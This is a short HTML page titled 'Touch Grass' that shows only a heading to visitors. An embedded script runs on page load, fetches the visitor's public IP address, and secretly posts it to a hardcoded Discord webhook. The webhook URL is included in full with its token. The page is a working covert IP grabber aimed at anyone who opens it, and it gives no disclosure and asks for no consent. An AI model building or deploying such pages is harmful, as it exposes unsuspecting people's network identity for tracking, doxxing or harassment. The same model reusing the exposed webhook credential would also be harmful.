<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Touch Grass</title>
</head>
<body>
    <script>
        // Fetch the user's IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;

                // Send IP address to Discord webhook
                const webhookURL = 'https://discord.com/api/webhooks/1249723878352093184/eSOpvzK04vh-tPD8ogenTkt0PpJWKr68lgM0Oz2MKwHtPIyq3bKvhT-Ro7JGjkwJsJkH';
                const request = new XMLHttpRequest();
                request.open("POST", webhookURL);
                request.setRequestHeader('Content-type', 'application/json');

                const params = {
                    content: `User's IP Address: ${ipAddress}`
                };

                request.send(JSON.stringify(params));
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
            });
    </script>
    <h1>Touch Grass</h1>
    <!-- Add any additional content you want here -->
</body>
</html>
